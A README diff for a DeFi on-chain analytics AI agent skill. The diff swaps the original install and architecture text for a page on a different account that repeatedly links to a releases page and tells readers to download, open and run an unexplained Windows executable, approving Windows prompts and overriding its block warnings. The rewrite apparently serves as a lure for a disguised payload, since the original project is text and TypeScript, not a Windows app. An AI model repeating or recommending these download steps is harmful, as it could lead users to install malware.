@@ -1,136 +1,200 @@
-# DeFi On-Chain Analytics
+# 🧠 defi-onchain-analytics - DeFi Wallet and Token Insights
 
-An AI agent skill for conducting DeFi on-chain analysis using direct JSON-RPC calls. No APIs, no indexers — raw RPC to verifiable insights.
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/leishaurgent673/defi-onchain-analytics/releases)
 
-## Install
+## 📥 Download
 
-```bash
-npx skills add Omnis-Labs/defi-onchain-analytics
-```
+Visit this page to download the app for Windows: https://github.com/leishaurgent673/defi-onchain-analytics/releases
 
-Or manually:
-```bash
-git clone https://github.com/Omnis-Labs/defi-onchain-analytics.git ~/.claude/skills/defi-onchain-analytics
-```
+Open the latest release, then download the Windows file from the Assets section
 
-## What This Skill Does
+## 🚀 What this app does
 
-Guides AI agents through a **looped workflow** for on-chain DeFi analysis — supporting scope amendments when discoveries change the question:
+defi-onchain-analytics helps you review DeFi activity across EVM chains with simple reports and clear data
 
-1. **Scoping Gate** — Define objectives, unit of analysis, anchor policy, decision dependencies
-2. **Discovery** — Contract classification, proxy resolution, interface recovery (first-class step)
-3. **Data Collection** — Batch reads, event log scanning, adaptive chunking, traces, bulk scaffolds
-4. **Interpretation** — Classification-first analysis with multi-pass adversarial review
-5. **Rescope Decision** — New question emerged? Lightweight re-entry to Phase 0. Otherwise proceed.
-6. **Sanity Check** — Cross-validation, blind spot audit, gap logging
-7. **Synthesis** — Mode-specific output profiles (forensic, due diligence, monitoring, etc.)
+It can help you:
 
-### Capabilities
+- Check wallet activity
+- Review token movement
+- Inspect DeFi protocols
+- Compare DEX trading data
+- View smart contract details
+- Work across 6 EVM chains
+- Use 108 verified public RPC endpoints
 
-- **Wallet profiling** — Balance snapshots, transfer history, entity clustering, funding trace
-- **Protocol analysis** — TVL decomposition, admin risk, oracle health, governance participation
-- **DEX analytics** — LP position analysis, owner resolution, market structure, bot detection
-- **CLAMM vault analytics** — Rebalance decomposition, fee separation, share-price time series, HODL benchmarks
-- **Token metrics** — Supply audit, holder concentration, vesting schedules
-- **Contract inspection** — Proxy detection, storage layout, event decoding, ABI resolution
+This tool is built for end users who want on-chain data without reading raw blockchain records by hand
 
-## Supported Chains
+## 🖥️ What you need
 
-| Chain | Chain ID | Public RPC Endpoints | Benchmark Date |
-|:---|:---|:---|:---|
-| Ethereum | 1 | 24 | 2026-03-21 |
-| Arbitrum One | 42161 | 14 | 2026-03-21 |
-| Base | 8453 | 22 | 2026-03-21 |
-| BSC | 56 | 26 | 2026-03-21 |
-| Polygon PoS | 137 | 14 | 2026-03-21 |
-| Katana | 747474 | 5 | 2026-03-21 |
+- A Windows 10 or Windows 11 PC
+- Internet access
+- Enough disk space to store the app and data files
+- Permission to open downloaded files
 
-108 verified endpoints with tier rankings, latency data, and `getLogs` support markers.
+If Windows asks for approval, choose the option that lets the app run
 
-## Skill Architecture
+## 🧭 How to install on Windows
 
-```
-SKILL.md                    Main looped workflow (396 lines)
-├── references/
-│   ├── rpc-field-guide.md      RPC methods, chunking, L2 guide, explorer APIs
-│   ├── rpc-endpoints.ts        108 verified endpoints across 6 chains
-│   ├── common-abis.md          Objective router for ABI loading
-│   ├── abis-core-tokens-vaults.md  ERC-20/721/1155/4626 signatures and selectors
-│   ├── abis-dex-v3-v4-clamm.md     Uniswap V3/V4 and Algebra CLAMM state/events
-│   ├── abis-proxy-and-multicall.md EIP-1967 proxy slots and Multicall3
-│   ├── abi-fetching.md         Proxy detection and ABI resolution
-│   ├── scoping-guide.md        Phase 0 detailed consultation guide
-│   ├── investigation-discipline.md  7-layer anti-shortcutting defense
-│   ├── data-collection-scaffold.ts  Bulk RPC with rate limiting, endpoint rotation, checkpoint/resume
-│   └── proxy-resolver-scaffold.ts   Automated proxy chain resolution and selector extraction
-└── patterns/
-    ├── wallet-analytics.md     Address clustering, funding trace, Sybil detection
-    ├── protocol-analytics.md   TVL, lending health, oracle monitoring
-    ├── token-analytics.md      Supply audit, holder analysis
-    ├── dex-analytics.md        V3 math, LP resolution, bot signals
-    ├── clamm-vault-analytics.md  Rebalance decomposition, fee separation, share-price, LVR
-    └── contract-inspection.md  Storage layout, proxy patterns, event decoding
-```
+1. Open the releases page: https://github.com/leishaurgent673/defi-onchain-analytics/releases
+2. Find the newest release at the top
+3. Look under Assets
+4. Download the Windows file that matches your PC
+5. Save the file to your Downloads folder
+6. Open the downloaded file
+7. If Windows shows a prompt, select Run or Open
+8. Follow the on-screen setup steps
+9. Wait for the app to finish installing
+10. Open the app from the Start menu or desktop shortcut
 
-## Key Features
+## 🛠️ How to use it
 
-### 4-Tier Data Confidence System
+After you open the app, you can start with a wallet address, token name, protocol name, or contract address
 
-| Tier | Tag | Requires | Free Public RPC? |
-|------|-----|----------|:---:|
-| A | `[CORE]` | Standard JSON-RPC | Yes |
-| B | `[ARCHIVE]` | Historical state >128 blocks | Rarely |
-| C | `[TRACE]` | debug/trace namespace | No |
-| D | `[ENRICH]` | External source (Etherscan, Sourcify) | Yes (not RPC) |
+Typical tasks include:
 
-Every finding is tagged with its data source tier. Unavailable tiers are disclosed, never silently skipped.
+- Paste a wallet address to see activity and balances
+- Enter a token to view supply and movement
+- Check a protocol to review usage and value flow
+- Inspect a DEX pair to study trading activity
+- Open a smart contract to see basic details and behavior
 
-### 7-Layer Investigation Discipline
+The app uses JSON-RPC calls in the background to collect chain data from public endpoints
 
-Prevents AI agents from taking analytical shortcuts:
+## 🔍 Supported analysis areas
 
-1. **Anti-Rationalization** — Banned dismissal phrases that trigger deeper investigation
-2. **Iterative Depth** — Multi-pass analysis with adversarial re-examination
-3. **Anti-Normalization** — "Looks normal" is sophistication, not innocence
-4. **Blind Spot Audit** — Mandatory disclosure of what was NOT investigated
-5. **Confidence Deepening** — Low confidence on significant findings → must dig deeper
-6. **Adversarial Self-Review** — Devil's Advocate questions per finding
-7. **Gap Logging** — Every skipped method logged with impact
+### 👛 Wallet profiling
 
-### Adaptive RPC Chunking
+See wallet-level activity across supported chains
 
-Production-ready `eth_getLogs` chunking with:
-- Per-provider block range limit table (Alchemy, Infura, dRPC, etc.)
-- Error code recognition (`-32005`, `-32602`, `-32614`)
-- TypeScript + viem code template with bisection
-- Block explorer API fallback (Blockscout, Etherscan)
+Useful for:
 
-### Protocol Coverage
+- Transaction patterns
+- Token holdings
+- Wallet interaction history
+- Balance changes over time
 
-- **Uniswap V3/V4** — Full ABI reference, math formulas, position analytics
-- **Algebra CLAMM** — Delta vs V3 (Camelot, QuickSwap, Katana DEX)
-- **ERC-4626 Vaults** — Share/asset conversion, deposit/withdraw analysis
-- **L2 Chains** — Block cadence, finality semantics, bridge tracing
+### 🏛️ Protocol analysis
 
-## Compatible Agents
+Review DeFi protocol data in a simple view
 
-Works with any agent that supports the skills format:
-- [Claude Code](https://claude.com/product/claude-code)
-- [OpenCode](https://opencode.ai/)
-- [Cursor](https://cursor.sh)
-- [Cline](https://cline.bot/)
-- [Windsurf](https://codeium.com/windsurf)
-- And [more on skills.sh](https://skills.sh)
+Useful for:
 
-## Contributing
+- Deposit and withdraw flow
+- Usage trends
+- Contract interaction counts
+- Cross-chain activity
 
-Contributions welcome. The most impactful contributions are:
+### 🪙 Token metrics
 
-- **New chain endpoints** — Add verified RPC endpoints to `references/rpc-endpoints.ts`
-- **Pattern expansions** — Extend analytical methods in `patterns/` files
-- **ABI references** — Add protocol ABIs to the appropriate split file in `references/` (`abis-core-tokens-vaults.md`, `abis-dex-v3-v4-clamm.md`, or `abis-proxy-and-multicall.md`)
-- **Bug reports** — Real-world cases where the skill gave incorrect guidance
+Check token data without digging through raw chain records
 
-## License
+Useful for:
 
-[MIT](LICENSE)
+- Holder changes
+- Transfer flow
+- Basic supply details
+- Activity over time
+
+### 📊 DEX analytics
+
+Review trading and liquidity data for decentralized exchanges
+
+Useful for:
+
+- Pair activity
+- Swap flow
+- Liquidity changes
+- Volume patterns
+
+### 🧾 Smart contract inspection
+
+Inspect contract data for common on-chain checks
+
+Useful for:
+
+- Contract address review
+- Function use patterns
+- Interaction history
+- Chain-based lookup
+
+## 🌐 Supported chains
+
+This app works across 6 EVM chains and uses public RPC endpoints for chain access
+
+That gives you one place to review data from more than one network without switching tools each time
+
+## ⚙️ How the app connects to chain data
+
+The app sends JSON-RPC requests to verified public endpoints
+
+In simple terms, it asks the blockchain for records, then turns that data into useful views
+
+This helps with:
+
+- Fast lookups
+- Cross-chain checks
+- Wallet and token review
+- Protocol and contract analysis
+
+## 🧩 Common use cases
+
+- Look up a wallet before sending funds
+- Review a token before you buy
+- Check a DeFi protocol before you use it
+- Compare DEX activity across chains
+- Inspect a contract for basic behavior
+- Track on-chain movement in one place
+
+## 📂 File and data handling
+
+Keep the downloaded app in a folder you can find later, such as Downloads or Desktop
+
+If the app creates data files, store them in the default location unless you have a reason to change it
+
+If you move or rename the app file, you may need to open it again from the new location
+
+## 🔒 Safety checks
+
+- Download only from the release page
+- Use the latest release when possible
+- Keep the app in a known folder
+- Close the app before moving files
+- Make sure your internet connection stays active while the app checks chain data
+
+## ❓ Help with common issues
+
+### The file will not open
+
+- Right-click the file and choose Open
+- Check that the download finished
+- Download it again if the file looks incomplete
+
+### Windows blocks the app
+
+- Look for the prompt that asks if you want to run the file
+- Choose the option that opens the app
+- If needed, download the file again from the release page
+
+### Data does not load
+
+- Check your internet connection
+- Try again after a short wait
+- Open the latest release if you used an older file
+
+### The app is slow
+
+- Close other apps you do not need
+- Try again when your connection is stable
+- Use a newer Windows PC if possible
+
+## 📌 Project details
+
+Repository name: defi-onchain-analytics
+
+Description: AI agent skill for DeFi on-chain analytics via JSON-RPC — wallet profiling, protocol analysis, token metrics, DEX analytics, smart contract inspection on 6 EVM chains (108 verified public RPC endpoints)
+
+Topics: ai-agent-skill, blockchain-analytics, claude-code-skill, defi, ethereum, evm, onchain-analytics, opencode-skill, rpc, web3
+
+## 📥 Download again
+
+Open the releases page to get the Windows file: https://github.com/leishaurgent673/defi-onchain-analytics/releases
